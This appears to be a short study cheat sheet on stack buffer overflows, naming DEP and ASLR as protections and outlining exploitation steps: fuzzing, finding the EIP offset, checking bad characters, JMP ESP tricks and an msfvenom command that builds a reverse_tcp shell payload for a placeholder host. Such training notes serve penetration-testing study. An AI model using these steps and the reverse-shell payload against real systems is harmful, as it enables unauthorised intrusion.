*Buffers overflow*
Protection techniques
    Data Execution Prevention (DEP) prevents executing instructions in data pages.
    Address Space Layout Randomization (ASLR) randomizes addresses of loaded apps, libraries and os.
    Both the operating system and the binary needs to support it.
Buffers overflow
Exploitation
    Determine length of overflow trigger w/ binary search "A"x1000
    Determine exact EIP with pattern_create.rb & pattern_offset.rb
    Determine badchars to make sure all of your payload is getting through
    Develop exploit
    Is the payload right at ESP
    JMP ESP
    Is the payload before ESP
    sub ESP, 200 and then JMP ESP
    or
    call [ESP-200]
    msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -o filename
    Make sure it fits your payload length above
    Gain shell, local priv esc or rooted already?
